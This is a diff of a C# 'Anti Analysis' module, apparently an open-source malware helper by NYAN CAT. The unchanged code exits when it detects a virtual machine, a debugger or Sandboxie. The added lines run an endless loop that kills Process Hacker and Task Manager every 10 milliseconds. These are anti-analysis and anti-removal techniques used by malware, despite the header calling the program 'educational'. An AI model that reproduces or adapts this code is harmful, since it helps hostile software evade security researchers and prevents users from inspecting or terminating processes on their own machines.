@@ -1,14 +1,15 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Management;
 using System.Runtime.InteropServices;
-
+using System.Threading;
 
 //       │ Author     : NYAN CAT
-//       │ Name       : Anti Analysis v0.1
+//       │ Name       : Anti Analysis v0.2
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
-//       This program Is distributed for educational purposes only.
+//       This program is distributed for educational purposes only.
 
 
 namespace Anti_Analysis
@@ -30,6 +31,12 @@ namespace Anti_Analysis
         {
             if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
                 Environment.FailFast(null);
+
+            while (true)
+            {
+                DetectProcess();
+                Thread.Sleep(10);
+            }
         }
 
         private static bool DetectVirtualMachine()
@@ -69,7 +76,21 @@ namespace Anti_Analysis
         }
 
 
+        private static void DetectProcess()
+        {
+            foreach (Process p in Process.GetProcesses())
+            {
+                try
+                {
+                    if (processName.Contains(p.ProcessName))
+                        p.Kill();
+                }
+                catch { }
+            }
+        }
 
+
+        private readonly static List<string> processName = new List<string> { "ProcessHacker", "taskmgr" };
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
